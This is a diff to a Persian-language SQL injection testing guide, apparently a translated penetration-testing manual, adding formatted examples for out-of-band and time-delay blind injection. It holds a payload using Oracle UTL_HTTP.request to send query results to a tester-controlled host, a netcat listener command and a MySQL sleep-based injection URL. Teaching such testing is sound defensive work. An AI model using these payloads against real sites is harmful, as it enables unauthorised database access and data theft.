@@ -45,23 +45,29 @@ http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80'
 ```
 در این مثال، تست نفوگر مقدار ۱۰ را با نتیجه تابع UTL_HTTP.requestبه هم متصل می‌کند. این تابع Oracle تلاش خواهد کرد تا به testerserver متصل شود و یک درخواست HTTP GET شامل بازگشت از کاربر SELECT پرس و جو از DAL ایجاد کند. تستر می‌تواند یک وب سرور (‏به عنوان مثال Apache)‏ایجاد کند یا از ابزار Netcat استفاده کند:
 
-'''
+```js
 /home/tester/nc -nLp 80
 GET /SCOTT HTTP/1.1 
 Host: testerserver.com 
 Connection: close
-'''
+```
 ### تکنیک Time Delay Exploitation Technique
 
 تکنیک Time Delay Exploitation زمانی بسیار مفید است که تست نفوذگر آسیب پذیری Blind SQL Injection ای را پیدا کند که در آن نتیجه یک عملیات، مشخص نیست.
 این تکنیک شامل ارسال یک پرس و جوی دارای تاخیر زمانی به سمت برنامه بوده و تست نفوذگر می‌تواند با بررسی زمان پاسخ بازگشت داده شده از سرور، در صورت صحیح بودن شرایط، اطلاعات مورد نظر را استخراج نماید. این تکنیک بهره‌برداری می‌تواند از DBMS به DBMS دیگر متفاوت باشد.
 
 پرس و جوی SQL زیر را در نظر بگیرید:
-
+```sql
+SELECT * FROM products WHERE id_product=$id_product
+```
 همچنین برنامه ای را در نظر بگیرید که پرس و جوی بالا را اجرا می‌کند:
-
+```url
+http://www.example.com/product.php?id=10
+```
 درخواست مخرب می‌تواند به عنوان مثال در MySql نسخه 5 به شکل زیر باشد:
-
+```url
+http://www.example.com/product.php?id=10 AND IF (version() like ‘5%', sleep(10),'false')) --
+```
 در این مثال، تست نفوذگر بررسی می‌کند که آیا نسخه MySql ۵ است یا خیر. وی می‌تواند زمان تاخیر را افزایش دهد و پاسخ‌ها را نظارت کند.
 
 ### تکنیک Stored Procedure Injection
